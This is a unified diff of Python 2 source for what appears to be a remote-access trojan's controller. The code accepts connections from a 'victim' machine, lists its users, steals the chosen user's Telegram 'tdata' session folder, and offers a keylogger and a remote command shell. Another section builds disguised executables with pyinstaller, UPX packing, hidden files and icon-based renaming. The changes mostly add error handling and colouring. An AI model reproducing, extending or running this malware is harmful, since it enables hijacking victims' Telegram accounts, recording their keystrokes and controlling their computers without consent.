@@ -7,16 +7,26 @@ from random import random
 import time
 init(autoreset=True)
 def download_tdata(client,file_save):
-    data_file=client.recv(1024)
-    while(data_file):
-        if 'pishmarg' in data_file:
-            break
-        else:
+    try:
+        data_file=client.recv(1024)
+    except:
+        print Back.BLUE+"\nSession Closed\n"
+        return False
+    else:
+        while(data_file):
+            if 'pishmarg' in data_file:
+                break
+            else:
+                file_save.write(data_file)
+                try:
+                    data_file=victim.recv(1024)
+                except:
+                    print Back.BLUE+"\nSession Closed\n"
+                    return False
+                    break
+        data_file=data_file.replace('pishmarg','')
+        if len(data_file)!=0:
             file_save.write(data_file)
-            data_file=victim.recv(1024)
-    data_file=data_file.replace('pishmarg','')
-    if len(data_file)!=0:
-        file_save.write(data_file)
 def check_integer(num):
     try:
         int(num)
@@ -42,7 +52,7 @@ def shell_or_keylogger(client):
                 try:
                     client.send('keylo')
                 except:
-                    print "\nSession Closed\n"
+                    print Back.BLUE+"\nSession Closed\n"
                     return False
                     break
                 else:
@@ -52,7 +62,7 @@ def shell_or_keylogger(client):
                 try:
                     client.send('shell')
                 except:
-                    print "\nSession Closed\n"
+                    print Back.BLUE+"\nSession Closed\n"
                     return False
                     break
                 else:
@@ -101,18 +111,16 @@ def shell_or_keylogger(client):
                                     file_logs.write(event_.replace('null','')+' ')
                                     file_logs.close()
             except socket.error:
-                print 'Sesssin Closed'
+                print Back.BLUE+'\nSesssin Closed\n'
                 return False
                 break
             except:
-                print '\n\nSTOP Keylogger'
+                print '\n\nSTOP Keylogger\n'
                 client.send('not')
                 return True
                 break
         if licen_lf==1:
             file_logs.close()
-
-        
     elif licen_item==2:
         print 'For Stop Shell ---> [type exit and enter]\n'
         print '\nSTART Shell'
@@ -122,55 +130,60 @@ def shell_or_keylogger(client):
             if my_path!='null':
                 break
         time.sleep(1)
-        list_drive=client.recv(20).split(':')
-        while True:
-            try:
-                cmd=raw_input(my_path+'>')
-            except:
-                pass
-            cmd=cmd.replace('\"','').replace('\'','')
-            try:
-                if cmd[0:3]=='cd ' and len(cmd)>3:
-                    client.send(cmd)
-                    time.sleep(1)
-                    res=client.recv(10240)
-                    if res=='not':
-                        print "The system cannot find the drive specified.\n"
-                    else:
-                        my_path=res
-                elif cmd.upper()[0] in list_drive and cmd[1]==':' and len(cmd)==2:
-                    client.send(cmd)
-                    time.sleep(1)
-                    res=client.recv(10240)
-                    if res=='not':
-                        print "The system cannot find the drive specified.\n"
-                    else:
-                        my_path=res
+        try:
+            list_drive=client.recv(20).split(':')
+        except:
+            print Back.BLUE+"\nSession Closed\n"
+            return False
+        else:
+            while True:
+                try:
+                    cmd=raw_input(my_path+'>')
+                except:
+                    pass
+                cmd=cmd.replace('\"','').replace('\'','')
+                try:
+                    if cmd[0:3]=='cd ' and len(cmd)>3:
+                        client.send(cmd)
+                        time.sleep(1)
+                        res=client.recv(10240)
+                        if res=='not':
+                            print "The system cannot find the drive specified.\n"
+                        else:
+                            my_path=res
+                    elif cmd.upper()[0] in list_drive and cmd[1]==':' and len(cmd)==2:
+                        client.send(cmd)
+                        time.sleep(1)
+                        res=client.recv(10240)
+                        if res=='not':
+                            print "The system cannot find the drive specified.\n"
+                        else:
+                            my_path=res
 
-                elif cmd.split()[0]=='exit':
-                    try:
-                        client.send('break')
-                        print '\n\nSTOP Shell'
-                    except:
-                        return False
-                        break
-                    else:
-                        return True
-                        break
+                    elif cmd.split()[0]=='exit':
+                        try:
+                            client.send('break')
+                            print '\n\nSTOP Shell\n'
+                        except:
+                            return False
+                            break
+                        else:
+                            return True
+                            break
                     
-                else:
-                    client.send(cmd)
-                    time.sleep(1)
-                    print client.recv(10240)
-            except socket.error:
-                print 'Sesssin Closed'	
-                return False
-                break
-            except:
-                client.send('break')
-                print 'STOP Shell'
-                return True
-                break
+                    else:
+                        client.send(cmd)
+                        time.sleep(1)
+                        print client.recv(10240)
+                except socket.error:
+                    print Back.BLUE+'\nSesssin Closed\n'	
+                    return False
+                    break
+                except:
+                    client.send('break')
+                    print '\nSTOP Shell\n'
+                    return True
+                    break
 def banner():
     if sys.platform[0:3]=='win':
         system('cls')
@@ -260,75 +273,96 @@ while True:
                     print Fore.RED+'[!]\x1b[0mCan\'t Listen %s:%s'%(lhost,lport)
                 else:
                     victim,addr=server.accept()
-                    hostname=victim.recv(1024)
-                    os_name=victim.recv(1024)
-                    print Fore.BLUE+'\n[*]\x1b[37mSession OPENED\x1b[0m'
-                    print Fore.BLUE+'[*]\x1b[37mVictim IP(%s)\x1b[0m'%(addr[0])
-                    print Fore.BLUE+'[*]\x1b[37mHostname (%s)\x1b[0m'%(hostname)
-                    print Fore.BLUE+'[*]\x1b[37mOS name (%s)\x1b[0m'%(os_name)
-                    print Fore.WHITE+'\nID\tUser List\n===\t========='
-                    user_list=victim.recv(10240)
-                    id_user=0
-                    user_list=user_list.split('\', \'')
-                    for user in user_list:
-                        print Fore.GREEN+'['+str(id_user)+']\t'+Fore.YELLOW+user
-                        id_user+=1
-                    print
-                    print Fore.WHITE+'\n====\t====\n'+Fore.GREEN+'[99]\t'+Fore.YELLOW+'exit'
-                    print
-                    
-                    licen_download_tdata=''
-                    while True:
+                    licen_process=True
+                    try:
+                        hostname=victim.recv(1024)
+                    except:
+                        print Back.BLUE+"\nSession Closed\n"
+                        
+                    else:
                         try:
-                            select_user=raw_input(Fore.CYAN+'SELECT> ')
+                            os_name=victim.recv(1024)
                         except:
-                            pass
-                        if select_user=='99':
-                            victim.send('break')
-                            break
-                        elif check_integer(select_user)==True:
-                            if int(select_user)==0 or int(select_user)<=id_user:
+                            print Back.BLUE+"\nSession Closed\n"
+                        else:        
+                            print Fore.BLUE+'\n[*]\x1b[37mSession OPENED\x1b[0m'
+                            print Fore.BLUE+'[*]\x1b[37mVictim IP(%s)\x1b[0m'%(addr[0])
+                            print Fore.BLUE+'[*]\x1b[37mHostname (%s)\x1b[0m'%(hostname)
+                            print Fore.BLUE+'[*]\x1b[37mOS name (%s)\x1b[0m'%(os_name)
+                            print Fore.WHITE+'\nID\tUser List\n===\t========='
+                            user_list=victim.recv(10240)
+                            id_user=0
+                            user_list=user_list.split('\', \'')
+                            for user in user_list:
+                                print Fore.GREEN+'['+str(id_user)+']\t'+Fore.YELLOW+user
+                                id_user+=1
+                            print
+                            print Fore.WHITE+'\n====\t====\n'+Fore.GREEN+'[99]\t'+Fore.YELLOW+'exit'
+                            print
+                    
+                            licen_download_tdata=''
+                            csf=False
+                            while True:
                                 try:
-                                    victim.send(user_list[int(select_user)])
+                                    select_user=raw_input(Fore.CYAN+'SELECT> ')
                                 except:
-                                    print "\nSession Closed\n"
+                                   pass
+                                if select_user=='99':
+                                    try:
+                                        victim.send('break')
+                                    except socket.error:
+                                        csf=True
+                                        print Back.BLUE+"\nSession Closed\n"
                                     break
+                                elif check_integer(select_user)==True:
+                                    if int(select_user)==0 or int(select_user)<=id_user:
+                                        try:
+                                            victim.send(user_list[int(select_user)])
+                                        except:
+                                            print Back.BLUE+"\nSession Closed\n"
+                                            break
+                                        else:
+                                            licen_download_tdata=victim.recv(3)
+                                            if licen_download_tdata=='yes':
+                                                break
+                                            else:
+                                                print '\n'+user_list[int(select_user)]+' Has Not Telegram\n'
+                                    else:
+                                        print "\nInvalid ID\n"
                                 else:
-                                    licen_download_tdata=victim.recv(3)
-                                    if licen_download_tdata=='yes':
+                                    print "\nInvalid ID\n"
+                            rd=True
+                            if licen_download_tdata=='yes':
+                                print Fore.MAGENTA+'\nStart Download (TDATA) Folder\n'+Fore.GREEN+'============================='
+                                print ''
+                                random_name='tdata_'+str(random()).replace('0.','')+'.tar.bz2'
+                                popen('mkdir downloads').read()
+                                f=open('./downloads/'+random_name,'wb')
+                                
+                                rd=download_tdata(victim,f)
+                                if rd==False:
+                                    print Back.RED+"\nBreak Download (TDATA) Folder\n"
+                                else:
+                                    print Fore.CYAN+'Save -> downloads/'+random_name
+                                print Fore.GREEN+'\n=============================\n'
+                                f.close()
+                            print
+                            if csf==False and rd==None:
+                                while True:
+                                    try:
+                                        qks=raw_input('You Can Access Shell Or Keylogger?[y/n]')
+                                    except:
+                                        pass
+                                    if qks in ['YES','yes','Yes','y','Y']:
+                                        session_status=shell_or_keylogger(victim)
+                                        if session_status==True:
+                                            pass
+                                        else:
+                                            break
+                                    elif qks in ['N','n','No','NO','no']:
                                         break
                                     else:
-                                        print '\n'+user_list[int(select_user)]+' Has Not Telegram\n'
-                            else:
-                                print "\nInvalid ID\n"
-                        else:
-                            print "\nInvalid ID\n"
-                    if licen_download_tdata=='yes':
-                        print Fore.MAGENTA+'\nStart Download (TDATA) Folder\n'+Fore.GREEN+'============================='
-                        print ''
-                        random_name='tdata_'+str(random()).replace('0.','')+'.tar.bz2'
-                        popen('mkdir downloads').read()
-                        f=open('./downloads/'+random_name,'wb')
-                        download_tdata(victim,f)
-                        f.close()
-                        print Fore.CYAN+'Save -> downloads/'+random_name
-                        print Fore.GREEN+'\n=============================\n'
-                    print 
-                    while True:
-                        try:
-                            qks=raw_input('You Can Access Shell Or Keylogger?[y/n]')
-                        except:
-                            pass
-                        if qks in ['YES','yes','Yes','y','Y']:
-                            session_status=shell_or_keylogger(victim)
-                            if session_status==True:
-                                pass
-                            else:
-                                break
-                        elif qks in ['N','n','No','NO','no']:
-                            break
-                        else:
-                            print "\nInvalid : Enter y OR n\n"                                        
+                                        print "\nInvalid : Enter y OR n\n"                                        
     elif cmd=='1':
         print
         lhost=raw_input(Fore.GREEN+'LHOST-> ')
@@ -389,13 +423,13 @@ while True:
         file_st=open(payload_name+'.py','wb')
         file_st.write(source_payload)
         file_st.close()
-        popen('attrib +h '+payload_name+'.py')
+        popen('attrib +h '+payload_name+'.py').read()
         popen('pyinstaller --onefile '+payload_name+'.py -i '+icon_path+' --onefile').read()
-        popen('attrib -h '+payload_name+'.py')
+        popen('attrib -h '+payload_name+'.py').read()
         remove(payload_name+'.py')
         remove(payload_name+'.spec')
         popen('rmdir /Q /S build').read()
-        popen('tools\\upx.exe dist\\'+payload_name+'.exe')
+        popen('tools\\upx.exe dist\\'+payload_name+'.exe').read()
         if licen_ico==True:
             new_ren=payload_name+key_icon[icon_select][1]+'.exe'
             popen('ren dist\\'+payload_name+'.exe '+new_ren)
